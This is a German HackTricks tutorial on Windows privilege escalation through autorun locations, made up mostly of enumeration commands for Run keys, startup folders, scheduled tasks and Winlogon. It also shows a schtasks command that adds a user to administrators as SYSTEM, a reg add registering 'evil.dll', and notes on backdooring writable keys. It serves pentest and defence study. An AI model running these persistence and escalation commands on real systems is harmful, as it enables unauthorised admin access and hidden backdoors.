# Privilegienerweiterung mit Autoruns

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** für **Intigriti**, eine Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns bei unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) heute und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** kann verwendet werden, um Programme beim **Startup** auszuführen. Sehen Sie, welche Binaries so programmiert sind, dass sie beim Startup ausgeführt werden:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geplante Aufgaben

**Aufgaben** können mit **bestimmter Häufigkeit** geplant werden. Sehen Sie, welche Binaries geplant sind, um ausgeführt zu werden mit:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Ordner

Alle Binaries, die sich in den **Startup-Ordnern befinden, werden beim Start ausgeführt**. Die gängigen Startup-Ordner sind die im Folgenden aufgeführten, aber der Startup-Ordner ist in der Registrierung angegeben. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registrierung

> [!NOTE]
> [Hinweis von hier](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Der **Wow6432Node** Registrierungseintrag zeigt an, dass Sie eine 64-Bit Windows-Version ausführen. Das Betriebssystem verwendet diesen Schlüssel, um eine separate Ansicht von HKEY_LOCAL_MACHINE\SOFTWARE für 32-Bit-Anwendungen anzuzeigen, die auf 64-Bit Windows-Versionen ausgeführt werden.

### Ausführungen

**Allgemein bekanntes** AutoRun-Registrierung:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registrierungsschlüssel, die als **Run** und **RunOnce** bekannt sind, sind dafür ausgelegt, Programme automatisch auszuführen, jedes Mal wenn ein Benutzer sich im System anmeldet. Die Befehlszeile, die als Datenwert eines Schlüssels zugewiesen ist, ist auf 260 Zeichen oder weniger beschränkt.

**Dienstausführungen** (kann den automatischen Start von Diensten während des Bootvorgangs steuern):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

In Windows Vista und späteren Versionen werden die **Run** und **RunOnce** Registrierungsschlüssel nicht automatisch generiert. Einträge in diesen Schlüsseln können entweder Programme direkt starten oder sie als Abhängigkeiten angeben. Um beispielsweise eine DLL-Datei beim Anmelden zu laden, könnte man den **RunOnceEx** Registrierungsschlüssel zusammen mit einem "Depend"-Schlüssel verwenden. Dies wird demonstriert, indem ein Registrierungseintrag hinzugefügt wird, um "C:\temp\evil.dll" während des Systemstarts auszuführen:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Exploit 1**: Wenn Sie in eines der genannten Registrierungen innerhalb von **HKLM** schreiben können, können Sie die Berechtigungen erhöhen, wenn sich ein anderer Benutzer anmeldet.

> [!NOTE]
> **Exploit 2**: Wenn Sie eine der angegebenen Binärdateien in einer der Registrierungen innerhalb von **HKLM** überschreiben können, können Sie diese Binärdatei mit einem Hintertür versehen, wenn sich ein anderer Benutzer anmeldet, und die Berechtigungen erhöhen.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup-Pfad

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Verknüpfungen, die im **Startup**-Ordner platziert werden, lösen automatisch das Starten von Diensten oder Anwendungen während der Benutzeranmeldung oder des Systemneustarts aus. Der Speicherort des **Startup**-Ordners ist in der Registrierung sowohl für den **Local Machine**- als auch für den **Current User**-Bereich definiert. Das bedeutet, dass jede Verknüpfung, die an diesen angegebenen **Startup**-Standorten hinzugefügt wird, sicherstellt, dass der verlinkte Dienst oder das Programm nach dem Anmelde- oder Neustartprozess gestartet wird, was es zu einer einfachen Methode macht, Programme automatisch auszuführen.

> [!NOTE]
> Wenn Sie einen beliebigen \[User] Shell Folder unter **HKLM** überschreiben können, können Sie ihn auf einen von Ihnen kontrollierten Ordner verweisen und ein Backdoor platzieren, das jedes Mal ausgeführt wird, wenn ein Benutzer sich im System anmeldet, wodurch die Berechtigungen erhöht werden.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon-Schlüssel

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Typischerweise ist der **Userinit**-Schlüssel auf **userinit.exe** gesetzt. Wenn dieser Schlüssel jedoch geändert wird, wird die angegebene ausführbare Datei auch von **Winlogon** beim Benutzer-Login gestartet. Ebenso soll der **Shell**-Schlüssel auf **explorer.exe** verweisen, das die Standard-Shell für Windows ist.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> Wenn Sie den Registrierungswert oder die Binärdatei überschreiben können, werden Sie in der Lage sein, die Berechtigungen zu erhöhen.

### Richtlinieneinstellungen

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Überprüfen Sie den **Run**-Schlüssel.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Ändern der Eingabeaufforderung im abgesicherten Modus

Im Windows-Registrierungseditor unter `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` gibt es einen **`AlternateShell`** Wert, der standardmäßig auf `cmd.exe` gesetzt ist. Das bedeutet, wenn Sie beim Start "Abgesicherter Modus mit Eingabeaufforderung" wählen (durch Drücken von F8), wird `cmd.exe` verwendet. Es ist jedoch möglich, Ihren Computer so einzurichten, dass er automatisch in diesem Modus startet, ohne dass Sie F8 drücken und es manuell auswählen müssen.

Schritte zum Erstellen einer Boot-Option für den automatischen Start im "Abgesicherten Modus mit Eingabeaufforderung":

1. Ändern Sie die Attribute der `boot.ini`-Datei, um die schreibgeschützten, System- und versteckten Flags zu entfernen: `attrib c:\boot.ini -r -s -h`
2. Öffnen Sie `boot.ini` zur Bearbeitung.
3. Fügen Sie eine Zeile wie folgt ein: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Speichern Sie die Änderungen an `boot.ini`.
5. Wenden Sie die ursprünglichen Dateiattribute erneut an: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Das Ändern des **AlternateShell**-Registrierungsschlüssels ermöglicht die Einrichtung einer benutzerdefinierten Befehlszeile, möglicherweise für unbefugten Zugriff.
- **Exploit 2 (PATH Schreibberechtigungen):** Schreibberechtigungen für einen Teil der System-**PATH**-Variablen, insbesondere vor `C:\Windows\system32`, ermöglichen es Ihnen, ein benutzerdefiniertes `cmd.exe` auszuführen, das ein Hintertür sein könnte, wenn das System im abgesicherten Modus gestartet wird.
- **Exploit 3 (PATH und boot.ini Schreibberechtigungen):** Schreibzugriff auf `boot.ini` ermöglicht den automatischen Start im abgesicherten Modus und erleichtert den unbefugten Zugriff beim nächsten Neustart.

Um die aktuelle **AlternateShell**-Einstellung zu überprüfen, verwenden Sie diese Befehle:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installierte Komponente

Active Setup ist eine Funktion in Windows, die **vor dem vollständigen Laden der Desktopumgebung initiiert** wird. Sie priorisiert die Ausführung bestimmter Befehle, die abgeschlossen sein müssen, bevor die Benutzeranmeldung fortgesetzt wird. Dieser Prozess erfolgt sogar vor anderen Starteinträgen, wie denen in den Registry-Bereichen Run oder RunOnce.

Active Setup wird über die folgenden Registrierungsschlüssel verwaltet:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Innerhalb dieser Schlüssel existieren verschiedene Unterschlüssel, die jeweils einem bestimmten Bestandteil entsprechen. Wichtige Schlüsselwerte sind:

- **IsInstalled:**
- `0` zeigt an, dass der Befehl des Bestandteils nicht ausgeführt wird.
- `1` bedeutet, dass der Befehl einmal für jeden Benutzer ausgeführt wird, was das Standardverhalten ist, wenn der Wert `IsInstalled` fehlt.
- **StubPath:** Definiert den Befehl, der von Active Setup ausgeführt werden soll. Es kann sich um jede gültige Befehlszeile handeln, wie das Starten von `notepad`.

**Sicherheitsinformationen:**

- Das Ändern oder Schreiben in einen Schlüssel, bei dem **`IsInstalled`** auf `"1"` gesetzt ist, mit einem bestimmten **`StubPath`** kann zu unbefugter Befehlsausführung führen, möglicherweise zur Erhöhung von Rechten.
- Das Ändern der Binärdatei, die in einem **`StubPath`**-Wert referenziert wird, könnte ebenfalls zur Erhöhung von Rechten führen, sofern ausreichende Berechtigungen vorhanden sind.

Um die **`StubPath`**-Konfigurationen über Active Setup-Komponenten zu überprüfen, können diese Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Übersicht über Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) sind DLL-Module, die zusätzliche Funktionen zu Microsofts Internet Explorer hinzufügen. Sie werden bei jedem Start in Internet Explorer und Windows Explorer geladen. Ihre Ausführung kann jedoch blockiert werden, indem der **NoExplorer**-Schlüssel auf 1 gesetzt wird, wodurch sie daran gehindert werden, mit Windows Explorer-Instanzen zu laden.

BHOs sind mit Windows 10 über Internet Explorer 11 kompatibel, werden jedoch in Microsoft Edge, dem Standardbrowser in neueren Versionen von Windows, nicht unterstützt.

Um BHOs, die auf einem System registriert sind, zu erkunden, können Sie die folgenden Registrierungsschlüssel überprüfen:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Jeder BHO wird durch seine **CLSID** in der Registrierung dargestellt, die als eindeutiger Identifikator dient. Detaillierte Informationen zu jeder CLSID finden Sie unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Um BHOs in der Registrierung abzufragen, können diese Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer-Erweiterungen

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Beachten Sie, dass die Registrierung für jede DLL einen neuen Registrierungseintrag enthalten wird, der durch die **CLSID** dargestellt wird. Sie können die CLSID-Informationen in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` finden.

### Schriftarttreiber

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Bilddatei-Ausführungsoptionen
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Beachten Sie, dass alle Seiten, auf denen Sie Autoruns finden können, **bereits von** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) durchsucht wurden. Für eine **umfassendere Liste von automatisch ausgeführten** Dateien könnten Sie [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) von Sysinternals verwenden:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Mehr

**Finden Sie weitere Autoruns wie Registrierungen in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Referenzen

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug-Bounty-Tipp**: **Melden Sie sich an** für **Intigriti**, eine Premium-**Bug-Bounty-Plattform, die von Hackern für Hacker erstellt wurde**! Treten Sie uns bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) noch heute bei und beginnen Sie, Prämien von bis zu **$100.000** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
